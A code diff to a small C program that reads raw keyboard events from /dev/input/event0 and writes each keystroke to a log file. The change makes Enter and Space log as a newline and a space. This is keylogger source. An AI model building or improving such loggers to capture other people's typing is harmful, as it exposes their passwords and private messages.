@@ -19,11 +19,16 @@ static void print_code(int code) {
 	struct parse_event *p;
 	for (p = key_events; p->name != NULL; p++) {
 		if (p->value == (unsigned) code) {
-			//printf(" %s - ", p->name);
 			char keycopy[40];
-			strncpy(keycopy, &p->name[4], 40); // Chops off 'KEY_'
-			printf("%s\n", keycopy);
-			
+		
+			// Handle special cases (spaces, enter, etc)		
+			switch(p->value) {
+				case 28: strcpy(keycopy, "\n");
+					 break;
+				case 57: strcpy(keycopy, " ");
+					 break;
+				default: strncpy(keycopy, &p->name[4], 40); // Chops off 'KEY_'
+			}	
 
 			// Open log file
 			FILE *fp;
@@ -42,10 +47,11 @@ static void print_code(int code) {
 	}
 }
 
-int main() {
+int main(int argc, char *argv[]) {
 
   	// Open keyboard file input stream
 	char* keyboard = "/dev/input/event0"; // Todo: Handle /dev/input/eventX dynamically
+	
 	FILE* f = fopen(keyboard, "r");
 	if (f == NULL) {
 		perror("Keyboard input device not found");
@@ -61,13 +67,13 @@ int main() {
 		return 1;
 	}
 
- 	 // Create a listener to the input stream
+ 	// Create a listener to the input stream
 	while (1) {
 
     		// Read byte stream from input event
 		size_t readbyte = read(fd, evt, sizeof(evt));
 
-   		 // Check for incorrect reads
+   		// Check for incorrect reads
 		if (readbyte < (int) sizeof(struct input_event)) {
 			perror("Input too short to read");
 			return 1;
